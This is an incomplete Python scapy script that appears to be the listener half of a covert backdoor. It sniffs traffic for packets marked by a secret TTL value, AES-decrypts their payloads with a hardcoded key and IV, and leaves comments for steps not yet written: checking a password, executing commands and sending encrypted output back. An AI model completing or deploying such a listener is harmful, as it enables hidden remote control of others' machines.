from scapy.all import *
from Crypto.Cipher import AES
#Inputs
victimIP = "192.168.0.1"
ttlKey = 164
srcPort = 80
dstPort = 53
key = "0123456789abcdef"
IV = "abcdefghijklmnop"

def decryptCommand(command):
    global key
    global IV
    decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain

def encryptCommand(command):
    global key
    global IV
    encryptor = AES.new(key,AES.MODE_CFB,IV=IV)
    plain = encryptor.encrypt(command)
    return plain

def server(pkt):
    #Checks if its TCP
    if pkt.haslayer(TCP):
        ttl = pkt[IP].ttl
        #Checks if the ttl matches with ours
        if ttl == ttlKey:
            src_ip = pkt[IP].src
            payload = pkt["Raw"].load
            #Decrypt payload, sequence number
            decryptedData = decryptCommand(payload)
            print decryptedData
            #Check if password in payload is correct

            #Check if position and total matches and if it does execute command

            #Encrypt the output, password, position and total

            #Send it back
    #Checks if its UDP
    elif pkt.haslayer(UDP):
        ttl = pkt[IP].ttl
        #Checks if the ttl matches with ours
        if ttl == ttlKey:
            pkt.show()
            src_ip = pkt[IP].src
            #Decrypt payload, source port

            #Check if password in payload is correct

            #check if position and total matches and if it does execute command




sniff(filter="ip", prn=server)
